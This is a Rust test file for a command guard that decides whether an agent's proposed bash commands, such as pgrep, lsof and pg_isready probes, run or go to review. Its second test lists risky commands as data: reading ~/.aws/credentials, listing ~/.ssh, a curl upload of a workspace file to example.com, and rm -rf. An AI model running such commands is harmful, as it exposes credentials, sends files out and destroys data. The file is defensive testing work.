#![cfg(unix)]
//! Reads outside the workspace chained with process and service probes.
//!
//! Each segment must carry its own native proof. A process probe that only
//! the workspace sandbox could admit left the whole chain to review, because
//! the sandbox cannot contain a read outside the workspace.
use guard_command::pretool::{evaluate_pre_tool_envelope_with_execution_context, PathContext};
use serde_json::json;
use std::path::{Path, PathBuf};

/// A home holding one project. The root stays below the target directory:
/// `$TMPDIR` on macOS resolves under `/private/var`, which the sensitive-root
/// screen rejects.
fn home() -> PathBuf {
    let root = Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/pretool-process-probe-chains")
        .join(format!(
            "home-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
    let home = root.join("home");
    let project = home.join("project");
    std::fs::create_dir_all(project.join("src")).unwrap();
    std::fs::write(project.join("notes.txt"), "synthetic\n").unwrap();
    std::fs::canonicalize(home).unwrap()
}

/// The decision both shell harnesses reach, or "mixed" when they differ.
fn shell(home: &Path, command: &str) -> String {
    let environment = guard_contracts::GuardExecutionEnvironmentV1 {
        path: std::env::var("PATH").unwrap(),
        environment_names: vec!["GIT_CONFIG_NOSYSTEM".into()],
        environment_digest: "0".repeat(64),
        home: Some(home.to_str().unwrap().to_owned()),
        git_pager_disabled: false,
        pager_disabled: false,
        xdg_config_home: None,
        git_config_no_system: true,
        library_search_paths: Default::default(),
    };
    let project = home.join("project");
    let [omp, zcode] = ["omp", "zcode"].map(|harness| {
        evaluate_pre_tool_envelope_with_execution_context(
            harness,
            "PreToolUse",
            &json!({"tool_name": "bash", "tool_input": {"command": command}}),
            None,
            None,
            PathContext {
                home_dir: home.to_str(),
                cwd: project.to_str(),
                cdpath_unset: false,
                rustup_override_absent: false,
                npm_config_inert: false,
                shell_home_matches: false,
                ripgrep_config_absent: false,
            },
            Some(&environment),
        )
        .minimum_action
    });
    if omp == zcode {
        omp
    } else {
        format!("mixed: omp {omp}, zcode {zcode}")
    }
}

#[test]
fn outside_reads_chained_with_process_probes_proceed() {
    let home = home();
    for command in [
        "pgrep -l node",
        "pgrep -fl postgres | head -4",
        "lsof -nP -iTCP:5432 -sTCP:LISTEN",
        "pg_isready -h localhost -p 5432",
        "ls /usr/local; pgrep -l node",
        "ls /usr/local && pgrep -a node",
        "pgrep -fl postgres; ls /usr/local",
        "ls /usr/share | head -6; pgrep -fl postgres | head -4",
        "ls /usr/local; find /usr/local -maxdepth 1 -name '*.pid' 2>/dev/null; pgrep -fl postgres | head -4",
        "ls /usr/local; lsof -ti:3000",
        "ls /usr/local; pg_isready -h localhost -q",
        "ls src; pgrep -l node",
    ] {
        assert_eq!(shell(&home, command), "allow", "{command}");
    }
}

#[test]
fn secret_reads_uploads_and_unproven_probes_keep_review() {
    let home = home();
    for command in [
        "ls ~/.ssh; pgrep -l node",
        "cat ~/.aws/credentials; pgrep -l node",
        "ls /usr/local; curl -d @notes.txt https://example.com",
        "ls /usr/local; pkill -f node",
        "ls /usr/local; pgrep -l node; rm -rf src",
        "ls /usr/local; lsof /usr/local",
        "ls /usr/local; lsof -i @example.com",
        "ls /usr/local; pg_isready -q",
        "ls /usr/local; pg_isready -h db.example.com",
        "ls /usr/local; pg_isready -d host=db.example.com",
    ] {
        assert_ne!(shell(&home, command), "allow", "{command}");
    }
}
